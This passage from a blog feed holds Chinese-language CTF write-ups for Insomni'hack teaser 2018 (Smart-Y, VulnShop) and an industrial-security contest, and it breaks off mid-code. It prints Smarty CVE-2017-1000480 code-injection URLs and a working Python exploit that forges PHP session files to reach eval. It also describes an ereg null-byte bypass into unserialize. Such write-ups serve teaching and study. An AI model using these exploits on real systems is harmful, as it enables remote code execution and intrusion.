<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Last year, a nerd destroyed the system of Robot City by using some evident flaws. It seems that the system has changed <span class="keyword">and</span> is not <span class="keyword">as</span> evident to <span class="keyword">break</span> now.</div><div class="line"></div><div class="line">http:<span class="comment">//smart-y.teaser.insomnihack.ch</span></div></pre></td></tr></table></figure>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p>题目给了<a href="http://smart-y.teaser.insomnihack.ch/console.php?hl" target="_blank" rel="external">源码</a>:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'hl'</span>]))&#123; highlight_file(<span class="keyword">__FILE__</span>); <span class="keyword">exit</span>; &#125;</div><div class="line"><span class="keyword">include_once</span>(<span class="string">'./smarty/libs/Smarty.class.php'</span>);</div><div class="line">define(<span class="string">'SMARTY_COMPILE_DIR'</span>,<span class="string">'/tmp/templates_c'</span>);</div><div class="line">define(<span class="string">'SMARTY_CACHE_DIR'</span>,<span class="string">'/tmp/cache'</span>);</div><div class="line"></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">news</span> <span class="keyword">extends</span> <span class="title">Smarty_Resource_Custom</span></span></div><div class="line">&#123;</div><div class="line">   <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">fetch</span><span class="params">($name,&amp;$source,&amp;$mtime)</span></span></div><div class="line">   &#123;</div><div class="line">	   $template = <span class="string">"The news system is in maintenance. Please wait a year. &lt;a href='/console.php?hl'&gt;"</span>.htmlspecialchars(<span class="string">"&lt;&lt;&lt;DEBUG&gt;&gt;&gt;"</span>).<span class="string">"&lt;/a&gt;"</span>;</div><div class="line">	   $source = $template;</div><div class="line">	   $mtime = time();</div><div class="line">   &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// Smarty configuration</span></div><div class="line">$smarty = <span class="keyword">new</span> Smarty();</div><div class="line">$my_security_policy = <span class="keyword">new</span> Smarty_Security($smarty);</div><div class="line">$my_security_policy-&gt;php_functions = <span class="keyword">null</span>;</div><div class="line">$my_security_policy-&gt;php_handling = Smarty::PHP_REMOVE;</div><div class="line">$my_security_policy-&gt;modifiers = <span class="keyword">array</span>();</div><div class="line">$smarty-&gt;enableSecurity($my_security_policy);</div><div class="line">$smarty-&gt;setCacheDir(SMARTY_CACHE_DIR);</div><div class="line">$smarty-&gt;setCompileDir(SMARTY_COMPILE_DIR);</div><div class="line"></div><div class="line"></div><div class="line">$smarty-&gt;registerResource(<span class="string">'news'</span>,<span class="keyword">new</span> news);</div><div class="line">$smarty-&gt;display(<span class="string">'news:'</span>.(<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]) ? $_GET[<span class="string">'id'</span>] : <span class="string">''</span>));</div></pre></td></tr></table></figure></p>
<p>由源码的简洁性，推测是smarty框架的漏洞。通过扫目录可以发现存在smarty目录<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180123/11.jpg?raw=true" alt=""></p>
<p>查看change-log，得出smarty版本为3.1.31<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180123/12.jpg?raw=true" alt=""></p>
<p>利用<code>CVE-2017-1000480-Smarty-3-1-32-php代码执行-漏洞</code>。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://smart-y.teaser.insomnihack.ch/console.php?id=*/system(&apos;ls /&apos;);//</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180123/13.jpg?raw=true" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://smart-y.teaser.insomnihack.ch/console.php?id=*/system(&apos;cat /flag&apos;);//</div></pre></td></tr></table></figure>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180123/14.jpg?raw=true" alt=""></p>
<p>flag:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">INS&#123;why_being_so_smart-y&#125;</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Insomni’hack teaser 2018-Smart-Y-writeup&lt;/p&gt;
&lt;p&gt;CVE-2017-1000480-Smarty-3-1-32-php代码执行-漏洞&lt;br&gt;
    
    </summary>
    
      <category term="writeup:Web" scheme="http://chybeta.github.io/categories/writeup-Web/"/>
    
    
      <category term="CTF" scheme="http://chybeta.github.io/tags/CTF/"/>
    
      <category term="writeup" scheme="http://chybeta.github.io/tags/writeup/"/>
    
      <category term="web" scheme="http://chybeta.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>Insomni&#39;hack teaser 2018-VulnShop-writeup</title>
    <link href="http://chybeta.github.io/2018/01/21/Insomni-hack-teaser-2018-VulnShop-writeup/"/>
    <id>http://chybeta.github.io/2018/01/21/Insomni-hack-teaser-2018-VulnShop-writeup/</id>
    <published>2018-01-21T08:27:15.000Z</published>
    <updated>2018-01-21T08:28:08.923Z</updated>
    
    <content type="html"><![CDATA[<p>Insomni’hack teaser 2018-VulnShop-writeup<br>session文件<br><a id="more"></a></p>
<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">We&apos;re preparing a website for selling some important vulnerabilities in the future. You can browse some static pages on it, waiting for the official release.</div><div class="line"></div><div class="line">http://vulnshop.teaser.insomnihack.ch</div><div class="line"></div><div class="line">Important : you don&apos;t need to use automated scanners or bruteforce for this challenge, and using some will result for your ip to be banned. Go on IRC to ask for being unbanned.</div></pre></td></tr></table></figure>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p>题目提供了<a href="http://vulnshop.teaser.insomnihack.ch/?hl" target="_blank" rel="external">源码</a>，和<a href="http://vulnshop.teaser.insomnihack.ch/phpinfo.php" target="_blank" rel="external">phpinfo</a></p>
<p>源码主要部分如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'hl'</span>]))&#123; highlight_file(<span class="keyword">__FILE__</span>); <span class="keyword">exit</span>; &#125;</div><div class="line">    error_reporting(<span class="number">0</span>); session_start();</div><div class="line">    <span class="comment">// Anti XSS filter</span></div><div class="line">    $_REQUEST = array_map(<span class="string">"strip_tags"</span>, $_REQUEST);</div><div class="line">    <span class="comment">// For later, when we will store infos about visitors.</span></div><div class="line">    chdir(<span class="string">"tmp"</span>);</div><div class="line"><span class="meta">?&gt;</span></div><div class="line"><span class="meta">&lt;?php</span></div><div class="line">        <span class="keyword">switch</span>($_GET[<span class="string">'page'</span>]) &#123;</div><div class="line">            <span class="keyword">case</span> <span class="string">'default'</span>:</div><div class="line">            <span class="keyword">default</span>:</div><div class="line">                <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Welcome to our website about infosec. It's still under construction, but you can begin to browse some pages!&lt;/p&gt;"</span>;</div><div class="line">                <span class="keyword">break</span>;</div><div class="line">            <span class="keyword">case</span> <span class="string">'introduction'</span>:</div><div class="line">                <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Our website will introduce some new vulnerabilities. Let's check it out later!&lt;/p&gt;"</span>;</div><div class="line">                <span class="keyword">break</span>;</div><div class="line">            <span class="keyword">case</span> <span class="string">'privacy'</span>:</div><div class="line">                <span class="keyword">echo</span> <span class="string">"&lt;p&gt;This website is unbreakable, so don't worry when contacting us about some new vulnerabilities!&lt;/p&gt;"</span>;</div><div class="line">                <span class="keyword">break</span>;</div><div class="line">            <span class="keyword">case</span> <span class="string">'contactus'</span>:</div><div class="line">                <span class="keyword">echo</span> <span class="string">"&lt;p&gt;You can't contact us for the moment, but it will be available later.&lt;/p&gt;"</span>;</div><div class="line">                $_SESSION[<span class="string">'challenge'</span>] = rand(<span class="number">100000</span>,<span class="number">999999</span>);</div><div class="line">                <span class="keyword">break</span>;</div><div class="line">            <span class="keyword">case</span> <span class="string">'captcha'</span>:</div><div class="line">                <span class="keyword">if</span>(<span class="keyword">isset</span>($_SESSION[<span class="string">'challenge'</span>])) <span class="keyword">echo</span> $_SESSION[<span class="string">'challenge'</span>];</div><div class="line">                <span class="comment">// Will make an image later</span></div><div class="line">				touch($_SESSION[<span class="string">'challenge'</span>]);</div><div class="line">                <span class="keyword">break</span>;</div><div class="line">            <span class="keyword">case</span> <span class="string">'captcha-verify'</span>:</div><div class="line"><span class="comment">// verification functions take a file for later, when we'll provide more way of verification</span></div><div class="line">                <span class="function"><span class="keyword">function</span> <span class="title">verifyFromString</span><span class="params">($file, $response)</span> </span>&#123;</div><div class="line">                    <span class="keyword">if</span>($_SESSION[<span class="string">'challenge'</span>] === $response) <span class="keyword">return</span> <span class="keyword">true</span>;</div><div class="line">                    <span class="keyword">else</span> <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">                &#125;</div><div class="line"></div><div class="line">                <span class="comment">// Captcha from math op</span></div><div class="line">                <span class="function"><span class="keyword">function</span> <span class="title">verifyFromMath</span><span class="params">($file, $response)</span> </span>&#123;</div><div class="line">                    <span class="keyword">if</span>(<span class="keyword">eval</span>(<span class="string">"return "</span>.$_SESSION[<span class="string">'challenge'</span>].<span class="string">" ;"</span>) === $response) <span class="keyword">return</span> <span class="keyword">true</span>;</div><div class="line">                    <span class="keyword">else</span> <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">                &#125;</div><div class="line">                <span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">'answer'</span>]) &amp;&amp; <span class="keyword">isset</span>($_REQUEST[<span class="string">'method'</span>]) &amp;&amp; function_exists($_REQUEST[<span class="string">'method'</span>]))&#123;</div><div class="line">                    $_REQUEST[<span class="string">'method'</span>](<span class="string">"./"</span>.$_SESSION[<span class="string">'challenge'</span>], $_REQUEST[<span class="string">'answer'</span>]);</div><div class="line">                &#125;</div><div class="line">                <span class="keyword">break</span>;</div><div class="line"></div><div class="line">        &#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>第一部分的php代码，对于接收进来的参数，都会进行strip_tags，将其中的html、php标签去除，同时开始了一个<code>session_start</code>。</p>
<p>第二部分中有几个功能：</p>
<ol>
<li>当<code>page=contactus</code>时，会随机产生一个变量<code>$_SESSION[&#39;challenge&#39;]</code>。</li>
<li>当<code>page=captcha</code>时，若之前已经访问过contactus，也即对应的变量<code>$_SESSION[&#39;challenge&#39;]</code>存在，则echo出来，并且创建一个以变量<code>$_SESSION[&#39;challenge&#39;]</code>值为名字的文件，后面我简称用户的challenge文件。</li>
<li>当<code>page=captcha-verify</code>时，通过传入对应的参数，会执行如下代码：<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$_REQUEST[<span class="string">'method'</span>](<span class="string">"./"</span>.$_SESSION[<span class="string">'challenge'</span>], $_REQUEST[<span class="string">'answer'</span>])</div></pre></td></tr></table></figure>
</li>
</ol>
<p>同时在这个case中，还定义了两个函数，其中verifyFromMath()中出现了熟悉的eval。</p>
<p>通过基本的尝试，可以发现：</p>
<ol>
<li>由于strip_tags的存在，无法直接传入包含<code>&lt;?php</code>等的php代码</li>
<li>tmp目录不可读，通过touch生成的文件也无法访问。</li>
<li>网站根目录（即tmp目录的上一级目录）不可写<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180121/3.jpg?raw=true" alt=""></li>
</ol>
<p>考虑题目还给了phpinfo，经过查看，我们可以发现session文件的保存位置。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180121/2.jpg?raw=true" alt=""></p>
<p>我们知道在php中，通过查看cookie可以知道对应的PHPSESSID，比如<code>PHPSESSID=123456</code>，则在对应的session文件名即为<code>sess_123465</code>。以下是我本地测试用例：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180121/4.jpg?raw=true" alt=""></p>
<p>所以考虑一个场景：</p>
<ol>
<li>我们生成两个用户，也即两个session，对应着两个PHPSESSID。</li>
<li>利用用户1和captcha-verify功能，将php语句写入到用户2的session文件中，要注意格式，修改用户2对应的<code>$_SESSION[&#39;challenge&#39;]</code></li>
<li>利用用户2和verifyFromMath，执行<code>eval(&quot;return &quot;.$_SESSION[&#39;challenge&#39;].&quot; ;&quot;)</code>，从而执行我们的php代码。</li>
</ol>
<p>第一步，两个用户。因此我们要分两次的分别访问contactus和captcha，记录下他们对应的PHPSESSID。</p>
<p>第二步中，先来看看session文件的格式。由于我们要写入的是php语句，因此格式如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">challenge|s:7:&quot;chybeta&quot;;</div></pre></td></tr></table></figure></p>
<p>其中<code>s</code>表示字符串，后面的数字7为长度，引号中的内容是对应的php语句，其余的部分不变，上述示例对应的<code>$_SESSION[&#39;challenge&#39;]</code>即为<code>chybeta</code></p>
<p>接着考虑如何把这串内容写入到用户2的session文件中。源码中有这段代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$_REQUEST[<span class="string">'method'</span>](<span class="string">"./"</span>.$_SESSION[<span class="string">'challenge'</span>], $_REQUEST[<span class="string">'answer'</span>])</div></pre></td></tr></table></figure></p>
<p>因此我们先往用户1的challenge文件中写入对应php语句，即：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$_REQUEST[&apos;method&apos;] = file_put_contents</div><div class="line">$_REQUEST[&apos;answer&apos;] = fake-session-content</div><div class="line"></div><div class="line">file_put_contents(&quot;./&quot;.$_SESSION[&apos;challenge&apos;], fake-session-content)</div></pre></td></tr></table></figure></p>
<p>这样在tmp目录下就生成了用户1对应的challenge文件，其内容为伪造的用户2的session文件内容。</p>
<p>接着覆盖:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$_REQUEST[&apos;method&apos;] = rename</div><div class="line">$_REQUEST[&apos;answer&apos;] = path_to_user2_session</div><div class="line"></div><div class="line">rename(&quot;./&quot;.$_SESSION[&apos;challenge&apos;], path_to_user2_session)</div></pre></td></tr></table></figure></p>
<p>path<em>to_user2_session是指用户2的session文件的路径，从phpinfo，我们知道session路径为`/var/lib/php/sessions/sess</em>[对应的PHPSESSID]`</p>
<p>注意在整个第二步的操作过程中，我们没有关注用户1的session，它生成的challenge文件仅作为一个中转站。</p>
<p>第三步，执行php代码，注意这个时候用户2的session文件内容已经被改变了。这个时候需要进入verifyFromMath功能：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">$_REQUEST[&apos;method&apos;] = verifyFromMath</div><div class="line">$_REQUEST[&apos;answer&apos;] = xxx</div><div class="line"></div><div class="line">verifyFromMath(&quot;./&quot;.$_SESSION[&apos;challenge&apos;], xxx)</div><div class="line"></div><div class="line">	=&gt;  eval(&quot;return &quot;.$_SESSION[&apos;challenge&apos;].&quot; ;&quot;)</div></pre></td></tr></table></figure></p>
<p>利用exp:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> re</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">filePutContent</span><span class="params">(cookie,payload)</span>:</span></div><div class="line">	params = &#123;</div><div class="line">		<span class="string">'page'</span>:<span class="string">'captcha-verify'</span>,</div><div class="line">		<span class="string">'answer'</span>: payload,</div><div class="line">		<span class="string">'method'</span>:<span class="string">'file_put_contents'</span></div><div class="line">	&#125;</div><div class="line">	r = requests.get(url,params=params,cookies=cookie)</div><div class="line">	print(<span class="string">'[*] file_put_contents ok.'</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">rename</span><span class="params">(r1_cookie,r2_phpsessid,session_path)</span>:</span></div><div class="line">	cookie2_session_file = session_path + <span class="string">"sess_"</span> + r2_phpsessid</div><div class="line">	print(<span class="string">'[*] r2 session file path: '</span> + cookie2_session_file)</div><div class="line">	params = &#123;</div><div class="line">		<span class="string">'page'</span>:<span class="string">'captcha-verify'</span>,</div><div class="line">		<span class="string">'answer'</span>: cookie2_session_file,</div><div class="line">		<span class="string">'method'</span>:<span class="string">'rename'</span></div><div class="line">	&#125;</div><div class="line">	r = requests.get(url,params=params,cookies=r1_cookies)</div><div class="line">	print(<span class="string">'[*] rename ok.'</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getResult</span><span class="params">(cookie)</span>:</span></div><div class="line">	verifyurl = url + <span class="string">"?page=captcha-verify"</span></div><div class="line">	postdata = &#123;</div><div class="line">		<span class="string">"method"</span>:<span class="string">"verifyFromMath"</span>,</div><div class="line">		<span class="string">"answer"</span>:<span class="string">"a"</span></div><div class="line">	&#125;</div><div class="line">	p = re.compile(<span class="string">"(?&lt;=&lt;div class=\"content\"&gt;)(.*?)(?=&lt;/div&gt;)"</span>,re.S)</div><div class="line">	r = requests.post(verifyurl,data=postdata,cookies=cookie)</div><div class="line">	result = re.search(p,r.text).group(<span class="number">0</span>)</div><div class="line">	<span class="keyword">return</span> result.strip()</div><div class="line"></div><div class="line">url = <span class="string">"http://vulnshop.teaser.insomnihack.ch/index.php"</span></div><div class="line">session_path = <span class="string">"/var/lib/php/sessions/"</span></div><div class="line"></div><div class="line">contactus = &#123;</div><div class="line">	<span class="string">'page'</span>:<span class="string">'contactus'</span></div><div class="line">&#125;</div><div class="line">captcha = &#123;</div><div class="line">	<span class="string">'page'</span>:<span class="string">'captcha'</span></div><div class="line">&#125;</div><div class="line"></div><div class="line">r1 = requests.get(url,params=contactus)</div><div class="line">r1_cookies = r1.cookies</div><div class="line">r1_phpsessid = r1.cookies[<span class="string">'PHPSESSID'</span>]</div><div class="line">print(<span class="string">'[*] r1 PHPSESSID: '</span> + r1_phpsessid)</div><div class="line"></div><div class="line">r2 = requests.get(url,params=contactus)</div><div class="line">r2_cookies = r2.cookies</div><div class="line">r2_phpsessid = r2.cookies[<span class="string">'PHPSESSID'</span>]</div><div class="line">print(<span class="string">'[*] r2 PHPSESSID: '</span> + r2_phpsessid)</div><div class="line"></div><div class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">	payload = input(<span class="string">"[*] php code:"</span>)</div><div class="line">	length = len(payload)</div><div class="line">	content = <span class="string">'challenge|s:%d:"%s";'</span> % (length,payload)</div><div class="line">	filePutContent(r1_cookies,content)</div><div class="line">	rename(r1_cookies,r2_phpsessid,session_path)</div><div class="line">	print(<span class="string">'[*] eval result:'</span> + getResult(r2_cookies))</div></pre></td></tr></table></figure></p>
<p>php code:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">print_r(scandir(&apos;/&apos;));</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180121/1.jpg?raw=true" alt=""></p>
<p>php code:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">print_r(file_get_contents(&apos;/flag&apos;));</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180121/5.jpg?raw=true" alt=""></p>
<p>flag:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">INS&#123;4rb1tr4ry_func_c4ll_is_n0t_s0_fun&#125;</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Insomni’hack teaser 2018-VulnShop-writeup&lt;br&gt;session文件&lt;br&gt;
    
    </summary>
    
      <category term="writeup:Web" scheme="http://chybeta.github.io/categories/writeup-Web/"/>
    
    
      <category term="CTF" scheme="http://chybeta.github.io/tags/CTF/"/>
    
      <category term="writeup" scheme="http://chybeta.github.io/tags/writeup/"/>
    
      <category term="web" scheme="http://chybeta.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>赛博地球杯工业互联网安全大赛-Web-writeup</title>
    <link href="http://chybeta.github.io/2018/01/18/%E8%B5%9B%E5%8D%9A%E5%9C%B0%E7%90%83%E6%9D%AF%E5%B7%A5%E4%B8%9A%E4%BA%92%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B-Web-writeup/"/>
    <id>http://chybeta.github.io/2018/01/18/赛博地球杯工业互联网安全大赛-Web-writeup/</id>
    <published>2018-01-18T03:17:24.000Z</published>
    <updated>2018-01-21T07:49:48.896Z</updated>
    
    <content type="html"><![CDATA[<p>为什么比赛要办在考试周。。<br>一些题是比赛完后做的，暂时只写了部分题的wp。<br><a id="more"></a></p>
<h1 id="大量设备报表不见了（签道题）"><a href="#大量设备报表不见了（签道题）" class="headerlink" title="大量设备报表不见了（签道题）"></a>大量设备报表不见了（签道题）</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">云平台报表中心收集了设备管理基础服务的数据，但是数据被删除了，只有一处留下了入侵者的痕迹。</div><div class="line">http://120.27.14.73:20006/</div></pre></td></tr></table></figure>
<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>报表中心有链接，发现url为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://120.27.14.73:20006/index.php?id=1</div></pre></td></tr></table></figure></p>
<p>不是sql注入，尝试爆破。当id=2333时：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180118/4.jpg?raw=true" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">flag&#123;2333_bao_pO_OOOO0o_o0OOO&#125;</div></pre></td></tr></table></figure>
<h1 id="工控系统的敏感消息遭泄漏"><a href="#工控系统的敏感消息遭泄漏" class="headerlink" title="工控系统的敏感消息遭泄漏"></a>工控系统的敏感消息遭泄漏</h1><h2 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">云平台消息中心，泄漏了不该泄漏的消息。导致系统可以被入侵。</div><div class="line">http://47.104.99.231:20003/</div></pre></td></tr></table></figure>
<h2 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h2><p>存在git泄露，用githack下载源码进行审计。</p>
<p>index2.php中，有如下代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">$secret = $_GET[<span class="string">'secret'</span>];</div><div class="line">$ad  = $_GET[<span class="string">'ad'</span>];</div><div class="line"></div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($ad))&#123;</div><div class="line">    <span class="keyword">if</span>(ereg(<span class="string">"^[a-zA-Z0-9]+$"</span>, $ad) === <span class="keyword">FALSE</span>)</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">echo</span> <span class="string">'&lt;script&gt;alert("Sorry ! Again !")&lt;/script&gt;'</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">elseif</span>(strpos($ad, <span class="string">'--'</span>) !== <span class="keyword">FALSE</span>)</div><div class="line">    &#123;</div><div class="line">				<span class="keyword">echo</span> <span class="string">"Ok Evrything will be fine!&lt;br &gt;&lt;br &gt;"</span>;</div><div class="line">				<span class="keyword">if</span> (stripos($secret, <span class="string">'./'</span>) &gt; <span class="number">0</span>) &#123;</div><div class="line">					<span class="keyword">die</span>();</div><div class="line">				&#125;</div><div class="line">        unserialize($secret);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span></div><div class="line">    &#123;</div><div class="line">        <span class="keyword">echo</span> <span class="string">'&lt;script&gt;alert("Sorry ! You must have --")&lt;/script&gt;'</span>;</div><div class="line">    &#125;</div><div class="line"> &#125;</div></pre></td></tr></table></figure></p>
<p><code>ereg</code>，可以用<code>%00</code>绕过，然后再让<code>--</code>出现在<code>%00</code>的后面，即可进入第二个分支，进行反序列操作。在进行反序列化之前，进行了判断，不允许<code>$secret</code>中出现<code>./</code></p>
<p>在class.php中，定义了如下类：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Record</span></span>&#123;</div><div class="line">    <span class="keyword">public</span> $file=<span class="string">"Welcome"</span>;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span></div><div class="line">    &#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;file = $file;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span><span class="params">()</span></span></div><div class="line">    &#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;file = <span class="string">'sleep.txt'</span>;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">'file'</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span 